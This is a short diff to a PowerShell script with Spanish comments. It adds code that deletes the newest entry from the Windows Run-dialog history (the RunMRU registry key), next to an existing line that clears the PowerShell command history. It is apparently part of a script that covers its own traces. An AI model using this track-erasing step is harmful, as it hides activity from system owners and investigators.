@@ -98,4 +98,16 @@ for ($i=0; $i -lt 4; $i++) {
 # Clear command history
 Clear-Content (Get-PSReadlineOption).HistorySavePath
 
+# Eliminar la última entrada del historial de "Ejecutar" en el Registro de Windows
+$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+$runHistory = Get-ItemProperty -Path $runKeyPath
+
+# Buscar la última entrada
+$lastKey = ($runHistory.PSObject.Properties | Where-Object { $_.Name -match "^[a-z]$" } | Sort-Object Name -Descending | Select-Object -First 1).Name
+
+# Eliminar la última entrada si existe
+if ($lastKey) {
+    Remove-ItemProperty -Path $runKeyPath -Name $lastKey -Force
+}
+
 exit
